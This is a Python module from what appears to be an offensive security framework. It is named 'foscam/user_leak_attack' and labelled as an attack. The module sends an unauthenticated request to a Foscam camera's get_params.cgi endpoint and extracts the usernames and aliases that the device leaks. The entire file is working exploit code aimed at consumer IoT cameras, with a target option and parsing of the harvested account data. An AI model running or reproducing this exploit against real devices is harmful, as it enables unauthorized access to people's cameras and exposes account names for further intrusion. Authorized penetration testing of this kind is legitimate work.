import httpx
from core.base import BaseModule

class Module(BaseModule):
    def __init__(self):
        super().__init__()
        self.name = "foscam/user_leak_attack"
        self.description = "Exploit module to harvest cleartext usernames and active aliases from Foscam cameras."
        self.type = "attack"
        self.options = {
            "TARGET": {"required": True, "value": ""},
            "PORT": {"required": False, "value": "88"}
        }

    async def run(self):
        target = self.options["TARGET"]["value"]
        port = self.options["PORT"]["value"]
        
        if not target.startswith(("http://", "https://")):
            url = f"http://{target}:{port}/get_params.cgi"
        else:
            url = f"{target.rstrip('/')}/get_params.cgi"
            
        try:
            async with httpx.AsyncClient(timeout=8.0) as client:
                print("\033[1;33m[*] Interrogating Foscam parameter CGI endpoint...\033[0m")
                response = await client.get(url)
                
                if response.status_code == 200 and "var user1=" in response.text:
                    lines = response.text.splitlines()
                    users = [line.strip() for line in lines if "var user" in line or "var alias" in line]
                    return {
                        "success": True,
                        "details": f"Foscam configuration parameters harvested:\n  " + "\n  ".join(users[:10])
                    }
        except Exception as e:
            return {"success": False, "error": str(e)}
        return {"success": False, "details": "Target responded but did not leak user variables."}
